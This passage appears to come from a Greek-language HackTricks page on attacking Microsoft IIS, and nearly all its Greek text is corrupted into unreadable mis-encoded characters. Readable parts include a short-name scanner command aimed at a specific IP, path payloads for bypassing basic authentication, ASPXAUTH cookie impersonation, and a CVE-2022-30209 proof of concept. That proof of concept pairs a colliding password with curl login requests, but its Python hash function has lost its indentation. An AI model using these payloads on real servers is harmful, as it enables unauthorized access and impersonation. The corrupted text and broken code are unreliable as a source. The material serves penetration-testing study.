ÎŸ ÎºÏÏÎ¹Î¿Ï‚ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼ÏŒÏ‚ Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ®Ï‚ Î±Î½ Î¿ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ ÎµÎ¯Î½Î±Î¹ ÎµÏ…Î¬Î»Ï‰Ï„Î¿Ï‚ ÎµÎ¯Î½Î±Î¹ ÏŒÏ„Î¹ **Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î²ÏÎµÎ¹ Î¼ÏŒÎ½Î¿ Î¼Î­Ï‡ÏÎ¹ Ï„Î± Ï€ÏÏÏ„Î± 6 Î³ÏÎ¬Î¼Î¼Î±Ï„Î± Ï„Î¿Ï… Î¿Î½ÏŒÎ¼Î±Ï„Î¿Ï‚ ÎºÎ¬Î¸Îµ Î±ÏÏ‡ÎµÎ¯Î¿Ï…/Ï†Î±ÎºÎ­Î»Î¿Ï… ÎºÎ±Î¹ Ï„Î± Ï€ÏÏÏ„Î± 3 Î³ÏÎ¬Î¼Î¼Î±Ï„Î± Ï„Î·Ï‚ ÎµÏ€Î­ÎºÏ„Î±ÏƒÎ·Ï‚** Ï„Ï‰Î½ Î±ÏÏ‡ÎµÎ¯Ï‰Î½.

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ [https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) Î³Î¹Î± Î½Î± Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÏ„Îµ Î±Ï…Ï„Î® Ï„Î·Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±:`java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../.gitbook/assets/image (844).png>)

Î‘ÏÏ‡Î¹ÎºÎ® Î­ÏÎµÏ…Î½Î±: [https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf](https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf)

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ **metasploit**: `use scanner/http/iis_shortname_scanner`

### Basic Authentication bypass

**Bypass** Î¼Î¹Î± Î²Î±ÏƒÎ¹ÎºÎ® Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· (**IIS 7.5**) Ï€ÏÎ¿ÏƒÏ€Î±Î¸ÏÎ½Ï„Î±Ï‚ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·: `/admin:$i30:$INDEX_ALLOCATION/admin.php` Î® `/admin::$INDEX_ALLOCATION/admin.php`

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± **Î¼ÎµÎ¯Î¾ÎµÏ„Îµ** Î±Ï…Ï„Î® Ï„Î·Î½ **ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±** ÎºÎ±Î¹ Ï„Î·Î½ Ï„ÎµÎ»ÎµÏ…Ï„Î±Î¯Î± Î³Î¹Î± Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î½Î­Î¿Ï…Ï‚ **Ï†Î±ÎºÎ­Î»Î¿Ï…Ï‚** ÎºÎ±Î¹ Î½Î± **bypass** Ï„Î·Î½ Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·.

## ASP.NET Trace.AXD enabled debugging

Î¤Î¿ ASP.NET Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Î¼Î¹Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Î±Ï€Î¿ÏƒÏ†Î±Î»Î¼Î¬Ï„Ï‰ÏƒÎ·Ï‚ ÎºÎ±Î¹ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ Ï„Î¿Ï… Î¿Î½Î¿Î¼Î¬Î¶ÎµÏ„Î±Î¹ `trace.axd`.

Î”Î¹Î±Ï„Î·ÏÎµÎ¯ Î­Î½Î± Ï€Î¿Î»Ï Î»ÎµÏ€Ï„Î¿Î¼ÎµÏÎ­Ï‚ Î±ÏÏ‡ÎµÎ¯Î¿ ÎºÎ±Ï„Î±Î³ÏÎ±Ï†Î®Ï‚ ÏŒÎ»Ï‰Î½ Ï„Ï‰Î½ Î±Î¹Ï„Î·Î¼Î¬Ï„Ï‰Î½ Ï€Î¿Ï… Î­Î³Î¹Î½Î±Î½ ÏƒÎµ Î¼Î¹Î± ÎµÏ†Î±ÏÎ¼Î¿Î³Î® ÎºÎ±Ï„Î¬ Ï„Î· Î´Î¹Î¬ÏÎºÎµÎ¹Î± Î¼Î¹Î±Ï‚ Ï€ÎµÏÎ¹ÏŒÎ´Î¿Ï….

Î‘Ï…Ï„Î­Ï‚ Î¿Î¹ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î½ IP Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Ï‰Î½ Ï€ÎµÎ»Î±Ï„ÏÎ½, IDs ÏƒÏ…Î½ÎµÎ´ÏÎ¯Î±Ï‚, ÏŒÎ»Î± Ï„Î± cookies Î±Î¹Ï„Î®Î¼Î±Ï„Î¿Ï‚ ÎºÎ±Î¹ Î±Ï€Î¬Î½Ï„Î·ÏƒÎ·Ï‚, Ï†Ï…ÏƒÎ¹ÎºÎ¿ÏÏ‚ Î´ÏÏŒÎ¼Î¿Ï…Ï‚, Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Ï€Î·Î³Î±Î¯Î¿Ï… ÎºÏÎ´Î¹ÎºÎ± ÎºÎ±Î¹ ÎµÎ½Î´ÎµÏ‡Î¿Î¼Î­Î½Ï‰Ï‚ Î±ÎºÏŒÎ¼Î± ÎºÎ±Î¹ Î¿Î½ÏŒÎ¼Î±Ï„Î± Ï‡ÏÎ·ÏƒÏ„ÏÎ½ ÎºÎ±Î¹ ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚.

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## ASPXAUTH Cookie

Î¤Î¿ ASPXAUTH Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î¹Ï‚ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚:

* **`validationKey`** (string): ÎºÎ»ÎµÎ¹Î´Î¯ ÏƒÎµ Î¼Î¿ÏÏ†Î® hex Î³Î¹Î± Ï‡ÏÎ®ÏƒÎ· ÏƒÏ„Î·Î½ ÎµÏ€Î¹ÎºÏÏÏ‰ÏƒÎ· Ï…Ï€Î¿Î³ÏÎ±Ï†Î®Ï‚.
* **`decryptionMethod`** (string): (Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î® â€œAESâ€).
* **`decryptionIV`** (string): Î±ÏÏ‡Î¹ÎºÎ¿Ï€Î¿Î¹Î·Ï„Î¹ÎºÏŒÏ‚ Î´Î¹Î±Î½ÏÏƒÎ¼Î±Ï„Î¿Ï‚ ÏƒÎµ Î¼Î¿ÏÏ†Î® hex (Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î® ÏƒÎµ Î´Î¹Î±Î½ÏÏƒÎ¼Î± Î¼Î·Î´ÎµÎ½Î¹ÎºÏÎ½).
* **`decryptionKey`** (string): ÎºÎ»ÎµÎ¹Î´Î¯ ÏƒÎµ Î¼Î¿ÏÏ†Î® hex Î³Î¹Î± Ï‡ÏÎ®ÏƒÎ· ÏƒÏ„Î·Î½ Î±Ï€Î¿ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ·.

Î©ÏƒÏ„ÏŒÏƒÎ¿, ÎºÎ¬Ï€Î¿Î¹Î¿Î¹ Î¬Î½Î¸ÏÏ‰Ï€Î¿Î¹ Î¸Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î½ Ï„Î¹Ï‚ **Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½ÎµÏ‚ Ï„Î¹Î¼Î­Ï‚** Î±Ï…Ï„ÏÎ½ Ï„Ï‰Î½ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÏ‰Î½ ÎºÎ±Î¹ Î¸Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î½ Ï‰Ï‚ **cookie Ï„Î¿ email Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î·**. Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î±Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î¼Î¹Î± Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´Î± Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î·Î½ **Î¯Î´Î¹Î± Ï€Î»Î±Ï„Ï†ÏŒÏÎ¼Î±** Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î¿ cookie ASPXAUTH ÎºÎ±Î¹ **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î±Î½ Ï‡ÏÎ®ÏƒÏ„Î· Î¼Îµ Ï„Î¿ email Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· Ï€Î¿Ï… Î¸Î­Î»ÎµÏ„Îµ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î¿Î¹Î·Î¸ÎµÎ¯Ï„Îµ** ÏƒÏ„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® Ï€Î¿Ï… Î´Î­Ï‡ÎµÏ„Î±Î¹ ÎµÏ€Î¯Î¸ÎµÏƒÎ·, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯ÏƒÏ„Îµ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿ cookie Î±Ï€ÏŒ Ï„Î¿Î½ Î´ÎµÏÏ„ÎµÏÎ¿ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® ÏƒÏ„Î¿Î½ Ï€ÏÏÏ„Î¿ ÎºÎ±Î¹ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î¿Î¹Î·Î¸ÎµÎ¯Ï„Îµ Ï„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î·.\
Î‘Ï…Ï„Î® Î· ÎµÏ€Î¯Î¸ÎµÏƒÎ· Î»ÎµÎ¹Ï„Î¿ÏÏÎ³Î·ÏƒÎµ ÏƒÎµ Î±Ï…Ï„Î® Ï„Î·Î½ [**writeup**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19).

## IIS Authentication Bypass with cached passwords (CVE-2022-30209) <a href="#id-3-iis-authentication-bypass" id="id-3-iis-authentication-bypass"></a>

[Î Î»Î®ÏÎ·Ï‚ Î±Î½Î±Ï†Î¿ÏÎ¬ ÎµÎ´Ï](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html): ÎˆÎ½Î± ÏƒÏ†Î¬Î»Î¼Î± ÏƒÏ„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± **Î´ÎµÎ½ Î­Î»ÎµÎ³Î¾Îµ ÏƒÏ‰ÏƒÏ„Î¬ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï€Î¿Ï… Î´ÏŒÎ¸Î·ÎºÎµ Î±Ï€ÏŒ Ï„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î·**, Î­Ï„ÏƒÎ¹ Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Ï„Î¿Ï… Î¿Ï€Î¿Î¯Î¿Ï… **Î¿ ÎºÎ±Ï„Î±ÎºÎµÏÎ¼Î±Ï„Î¹ÏƒÎ¼Î­Î½Î¿Ï‚ ÎºÏ‰Î´Î¹ÎºÏŒÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï‡Ï„Ï…Ï€Î¬ Î­Î½Î± ÎºÎ»ÎµÎ¹Î´Î¯** Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ Î®Î´Î· ÏƒÏ„Î·Î½ **cache** Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯ Ï‰Ï‚ Î±Ï…Ï„ÏŒÏ‚ Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚.
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾Ï„Îµ Ï„Î¿ HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
